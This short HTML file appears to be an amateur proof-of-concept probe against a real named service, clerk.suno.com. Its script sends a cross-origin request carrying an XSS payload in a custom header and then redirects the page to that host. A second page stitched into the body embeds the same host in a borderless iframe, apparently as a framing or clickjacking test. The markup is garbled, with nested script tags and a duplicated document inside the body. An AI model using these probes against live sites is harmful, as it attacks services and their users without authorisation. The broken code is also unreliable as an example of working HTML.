<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fetch Example</title>
</head>
<body>
    <h1>Fetch Example</h1>
    <script>
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://clerk.suno.com'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
    </script>

    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Embed with Iframe</title>
</head>
<body>
    <iframe src="https://clerk.suno.com" width="600" height="400" style="border:none;">
    Your browser does not support iframes.
</iframe>
    

</body>
</html>
